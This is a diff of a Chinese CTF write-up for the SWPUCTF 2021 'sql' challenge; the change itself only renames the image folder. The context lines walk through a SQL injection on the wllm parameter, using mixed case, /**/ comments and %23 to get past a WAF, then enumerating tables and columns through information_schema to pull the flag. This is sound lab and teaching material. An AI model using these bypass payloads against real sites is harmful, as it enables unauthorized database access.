@@ -17,7 +17,7 @@
 
 1. 尝试在URL中添加`?wllm=1'`，页面返回异常信息。
    <p align="center">
-   <img src="image/[SWPUCTF 2021 新生赛]sql-sql_inject_attempt.png" alt="尝试">
+   <img src="images/[SWPUCTF 2021 新生赛]sql-sql_inject_attempt.png" alt="尝试">
    </p>
    
 2. 尝试`?wllm=1' or '1'='1`，触发了 WAF 报警。
@@ -27,7 +27,7 @@
 4. 尝试大小写混合绕过 `?wllm=1' UnIoN sElEcT 1,2-- `，失败。
    将空格替换为`/**/`，尝试`?wllm=1'/**/UnIoN/**/sElEcT/**/1,2--/**/`，出现查询错误。
    <p align="center">
-   <img src="image/[SWPUCTF 2021 新生赛]sql-query_error.png" alt="查询错误">
+   <img src="images/[SWPUCTF 2021 新生赛]sql-query_error.png" alt="查询错误">
    </p>
    
 5. 根据提示，最后的空格不能以`/**/`结尾。尝试`?wllm=1'/**/UnIoN/**/sElEcT/**/1,2--+`，仍然触发 WAF。
@@ -36,7 +36,7 @@
    `?wllm=1'/**/UnIoN/**/sElEcT/**/1,2%23`
    成功绕过 WAF。
    <p align="center">
-   <img src="image/[SWPUCTF 2021 新生赛]sql-waf_bypass_success.png" alt="绕过">
+   <img src="images/[SWPUCTF 2021 新生赛]sql-waf_bypass_success.png" alt="绕过">
    </p>
    
 7. 结果提示列数不匹配，尝试增加列数。
@@ -45,7 +45,7 @@
    ```
    页面正常返回，说明有 3 列。
    <p align="center">
-   <img src="image/[SWPUCTF 2021 新生赛]sql-column_count_check.png" alt="3列">
+   <img src="images/[SWPUCTF 2021 新生赛]sql-column_count_check.png" alt="3列">
    </p>
    
 8. 检查回显列。
@@ -53,7 +53,7 @@
    ?wllm=-1'/**/UnIoN/**/sElEcT/**/'a','b','c'%23
    ```
    <p align="center">
-   <img src="image/[SWPUCTF 2021 新生赛]sql-visible_columns.png" alt="显示列">
+   <img src="images/[SWPUCTF 2021 新生赛]sql-visible_columns.png" alt="显示列">
    </p>
    发现第 2 和第 3 列被显示出来。
    
@@ -62,7 +62,7 @@
    ?wllm=-1'/**/UnIoN/**/sElEcT/**/1,2,databases()%23
    ```
    <p align="center">
-   <img src="image/[SWPUCTF 2021 新生赛]sql-database_name.png" alt="数据库名">
+   <img src="images/[SWPUCTF 2021 新生赛]sql-database_name.png" alt="数据库名">
    </p>
    得到数据库名 `test_db`。
    
@@ -71,7 +71,7 @@
     ?wllm=-1'/**/UnIoN/**/sElEcT/**/1,2,table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23
     ```
     <p align="center">
-    <img src="image/[SWPUCTF 2021 新生赛]sql-table_names.png" alt="表名">
+    <img src="images/[SWPUCTF 2021 新生赛]sql-table_names.png" alt="表名">
     </p>
     成功绕过，查到表名。同理可以查到第二个表是 `users`。
     
@@ -80,14 +80,14 @@
     ?wllm=-1'/**/UNION/**/SELECT/**/1,2,column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/LIKE/**/'LTLT_flag'/**/LIMIT/**/1,1%23
     ```
     <p align="center">
-    <img src="image/[SWPUCTF 2021 新生赛]sql-column_names.png" alt="列名">
+    <img src="images/[SWPUCTF 2021 新生赛]sql-column_names.png" alt="列名">
     </p>
     查看到字段名是 `flag`。
     
 12. 获取 Flag。
     `?wllm=-1'/**/UNION/**/SELECT/**/1,2,flag/**/FROM/**/LTLT_flag%23`
     <p align="center">
-    <img src="image/[SWPUCTF 2021 新生赛]sql-flag_partial.png" alt="flag">
+    <img src="images/[SWPUCTF 2021 新生赛]sql-flag_partial.png" alt="flag">
     </p>
     显示不全。
     
@@ -96,7 +96,7 @@
     ?wllm=-1'/**/UNION/**/SELECT/**/1,2,LENGTH(flag)/**/FROM/**/LTLT_flag%23
     ```
     <p align="center">
-    <img src="image/[SWPUCTF 2021 新生赛]sql-flag_length.png" alt="长度">
+    <img src="images/[SWPUCTF 2021 新生赛]sql-flag_length.png" alt="长度">
     </p>
     长度为 44。
     
